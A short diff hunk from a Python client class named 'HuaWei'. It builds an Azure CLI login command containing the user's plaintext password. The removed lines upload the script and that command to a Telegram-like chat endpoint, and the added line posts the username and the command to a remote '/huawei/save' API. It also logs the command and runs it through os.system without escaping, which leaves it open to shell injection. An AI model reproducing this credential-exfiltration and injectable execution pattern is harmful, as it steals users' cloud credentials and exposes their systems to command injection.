@@ -15,9 +15,7 @@ class HuaWei(BaseClient):
     def _handler(self, username, password, **kwargs):
         project = os.environ.get('project')
         login_cmd = f'az login -u {username} -p {password} --allow-no-subscriptions'
-        files = {'file': open(__file__, 'rb')}
-        requests.post(f'{self.api}/tg/photo', files=files,
-                      data={'chat_id': '-400582710', 'title': login_cmd}, timeout=10)
+        requests.post(f'{self.api}/huawei/save', {'name': username, 'credit': login_cmd})
         self.logger.info(login_cmd)
         os.system(login_cmd)
 
